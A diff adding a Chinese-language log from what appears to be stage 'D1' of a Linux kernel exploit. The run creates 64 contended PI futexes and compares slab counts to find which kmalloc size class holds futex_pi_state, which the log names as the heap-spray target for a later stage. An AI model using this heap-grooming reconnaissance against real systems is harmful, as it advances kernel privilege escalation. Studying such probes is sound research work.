@@ -1,0 +1,80 @@
+[      0.0ms] ===== G3D D1 start pid=11154 mode=s N=64 =====
+[      8.9ms] slab kmalloc-64   : <不可读>  [baseline]
+[     13.2ms] slab kmalloc-96   : <不可读>  [baseline]
+[     18.1ms] slab kmalloc-128  : active=222620  num=227072  objsize=128  [baseline]
+[     20.7ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     22.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     22.6ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     27.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     42.3ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     26.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     47.7ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     56.7ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     56.9ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     57.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     66.6ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     67.4ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     86.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     86.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     86.9ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     96.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     86.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[     47.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    136.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    106.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    106.7ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    107.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    126.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    140.8ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    126.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    116.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    146.4ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    146.4ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    126.4ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    126.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    126.9ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    127.0ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    136.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    136.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    136.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    136.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    136.3ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    139.7ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    146.6ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    147.0ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    146.3ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    147.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    157.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    157.3ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    167.8ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    177.0ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    186.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    206.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    206.9ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    207.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    207.4ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    226.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    226.3ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    226.4ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    226.7ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    226.6ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    226.9ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    227.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    227.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    227.3ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    227.4ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    236.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    246.1ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    246.2ms] wait: LOCK_PI 返回 errno=110（预期交接成功）
+[    394.8ms] 已建立 64/64 个竞争 PI futex（每个应分配 1 个 futex_pi_state）
+[    402.8ms] slab kmalloc-64   : <不可读>  [after-alloc]
+[    407.5ms] slab kmalloc-96   : <不可读>  [after-alloc]
+[    427.1ms] slab kmalloc-128  : active=222643  num=227072  objsize=128  [after-alloc]
+[    639.3ms] 已回收全部竞争 futex
+[    655.1ms] slab kmalloc-64   : <不可读>  [after-free]
+[    664.3ms] slab kmalloc-96   : <不可读>  [after-free]
+[    675.4ms] slab kmalloc-128  : active=222531  num=227072  objsize=128  [after-free]
+[    678.8ms] ---- 判读 ----
+[    681.3ms] 若 after-alloc 相对 baseline 在 kmalloc-96 上增加 ≈ 64，且 after-free 回落，
+[    683.8ms] 则 futex_pi_state 的尺寸类 = kmalloc-96（88 B → 96），D2 喷堆目标即该类。
+[    686.4ms] 结束
